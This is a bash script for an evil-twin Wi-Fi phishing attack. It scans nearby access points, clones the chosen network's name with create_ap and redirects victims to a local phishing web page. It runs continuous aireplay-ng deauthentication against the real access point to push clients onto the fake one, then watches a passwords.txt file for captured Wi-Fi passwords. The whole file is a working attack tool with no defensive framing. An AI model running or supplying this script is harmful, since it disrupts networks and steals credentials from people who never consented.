
DEAUTH_INTERFACE=wlo1
AP_INTERFACE=wlp0s20u1

checkdependencies()
{
	dpendencies=(ip arping cut ping mysql arping id hostnamectl httpd)
	for (( i = 0; i < ${#dpendencies[@]}; i++ )); do
		which ${dpendencies[$i]} >> /dev/null
		if [[ $? != 0 ]]; then
			echo "command ${dpendencies[$i]} : missing "
			exit
		fi
	done
}

stop_network_manager() {
	systemctl stop NetworkManager.service
}

check_root()
{
	if [[ `id -u` != 0 ]]; then
		echo "ERROR  : you should be root to use this tool"
		echo "ADVICE : enter su command to enter into root shell"
		exit
	fi
}

#	pacman -S aircrack-ng create_ap apache php php-apache xterm
#	copy http files for phishing from my http to /srv/http/ or /var/www/http/ and customize (optional)
#	configure php server and check it works or not

#	starting http server
httpd -k restart

#	awk fields for text processing
#	ESSID=14
#	BSSID=1
#	CHANNEL=4
#	CLIENT=grep -A 20 Station dump-01.csv 

ip link set dev $INTERFACE up
ip link set dev $AP_INTERFACE up
iwconfig $INTERFACE mode monitor

# 	press ctrl^c after it scans all APs
xterm -e "airodump-ng -w dump --output-format csv $INTERFACE"

clear
echo "Available Access Points are : "
awk -F"," '{print $14}' dump-01.csv | grep -v "ESSID" 
echo "Enter Access Point name to attack from above list (Case Sensitive) :"
read AP
ESSID=$( grep "$AP" dump-01.csv | awk -F"," '{print $14}' )
#	trim whitespaces
ESSID=$( echo $ESSID | awk '{$1=$1};1' )
if [ "$ESSID" == "$AP" ]
	then
BSSID=$( grep "$AP" dump-01.csv | awk -F"," '{print $1}' )
#	trim whitespaces
BSSID=$( echo $BSSID | awk '{$1=$1};1' )
CHANNEL=$( grep "$AP" dump-01.csv | awk -F"," '{print $4}' )
CLIENT_TMP=$( grep -A 20 "Station" dump-01.csv | grep "$BSSID"  )
CLIENT=$( cat dump-01.csv | awk -F"," '{print $1}' )
#	trim whitespaces
CLIENT=$( echo $CLIENT | awk '{$1=$1};1' )
echo "creating fake Access Point : "
#	deauth problem with sam mac
#	create_ap --redirect-to-localhost -n -c $CHANNEL --mac $BSSID $AP_INTERFACE $ESSID
(create_ap --daemon --redirect-to-localhost -n  $AP_INTERFACE "$ESSID" &)
echo "Done creating fake access points "
(xterm -e "airodump-ng -c $CHANNEL $INTERFACE" &)
sleep 3
# echo $BSSID > blacklist
(xterm -e "aireplay-ng -0 0 -a $BSSID $INTERFACE" &)
#	xterm -e "mdk3 $INTERFACE d b blacklist -c $CHANNEL"
echo "Waiting for user to enter password :"
(xterm -e "tail -f /srv/http/passwords.txt" &)
echo "Enter to clean up"
read nothing
#	killall xterm

#	cleanup everything
pid=$( create_ap --list-running | grep $AP_INTERFACE | awk '{print $1}' )
kill $pid
rm dump-*
echo "done...................!"
fi
